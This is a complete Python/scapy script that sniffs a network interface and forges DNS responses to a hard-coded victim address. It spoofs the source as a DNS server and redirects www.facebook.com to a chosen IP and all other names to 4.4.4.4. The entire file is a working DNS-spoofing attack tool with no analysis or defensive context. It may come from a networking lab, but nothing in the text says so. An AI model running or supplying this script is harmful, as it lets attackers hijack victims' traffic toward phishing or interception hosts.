#!/usr/bin/env python

from scapy.all import *


victim_addr = '172.19.131.29'
target_addr = '172.19.240.10'
target_ether_addr = '5c:a4:8a:d6:9e:20'
target_iface = 'en0'



def generate_fake_address(domain_name):
    if domain_name == 'www.facebook.com.':
        return '129.104.30.29', True
        
    else:
        return '4.4.4.4', False

def reply(p):

    if DNS in p:
        try :   
            domain_name = p[DNS].qd.qname
            #p.show()

            redirect_addr, sent_bool = generate_fake_address(domain_name)

            dns = DNS(id=p[DNS].id,qr=1,rd=p[DNS].rd,ra=p[DNS].ra,qd=p[DNS].qd,an=DNSRR(rrname=domain_name,ttl=42,rdata=redirect_addr))
            p2 = Ether(dst=target_ether_addr)/IP(src=target_addr,dst=victim_addr)/UDP(sport=53,dport=p[UDP].sport)/dns
            sendp(p2, iface=target_iface)
            
            if sent_bool :
                print("PACKET SENT !")
                p.show()
        except Exception as e :
            pass


conf.use_pcap = True
sniff(iface=target_iface, prn = reply, monitor = True)
